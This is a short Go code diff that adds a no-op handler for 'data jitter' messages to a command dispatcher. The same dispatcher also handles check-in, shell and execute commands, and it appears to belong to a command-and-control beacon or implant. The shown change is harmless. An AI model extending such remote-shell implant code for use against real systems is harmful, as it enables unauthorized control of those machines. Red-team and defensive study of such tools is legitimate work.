@@ -62,6 +62,8 @@ func main() {
 							switch cmdType {
 							case command.CMD_TYPE_CHECKIN:
 								_, execErr = packet.PullCommand()
+							case command.CMD_TYPE_DATA_JITTER: // useless data, do nothing
+								continue
 							case command.CMD_TYPE_SHELL:
 								execErr = command.Run(cmdBuf)
 							case command.CMD_TYPE_EXECUTE:
